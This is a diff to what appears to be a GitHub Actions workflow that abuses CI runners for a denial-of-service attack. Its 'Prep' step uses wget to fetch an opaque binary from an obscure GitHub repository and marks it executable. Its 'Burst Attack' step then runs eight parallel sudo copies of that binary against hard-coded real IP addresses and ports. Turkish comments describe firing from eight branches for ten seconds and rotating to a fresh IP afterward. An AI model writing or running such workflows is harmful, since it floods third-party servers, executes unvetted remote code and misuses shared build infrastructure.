@@ -16,14 +16,14 @@ jobs:
     steps:
       - name: Prep
         run: |
-          wget https://github.com/betoaiaio/brsovhv2/raw/refs/heads/master/brsovhv2 -O brsovhv2
-          chmod +x brsovhv2
+          wget https://github.com/urkwjrwmbewn/hoplatici.pl/raw/refs/heads/main/5 -O 5
+          chmod +x 5
 
       - name: Burst Attack
         run: |
           # 10 saniye boyunca 8 koldan mermi basıyoruz
           for i in {1..8}; do
-            sudo timeout 10 ./brsovhv2 216.202.200.164 53 &
+            sudo timeout 10 ./5 51.77.64.63 22 500 1000 60 &
           done
           
           # Makine 12 saniye sonra kapanacak, sıradaki taze IP gelecek
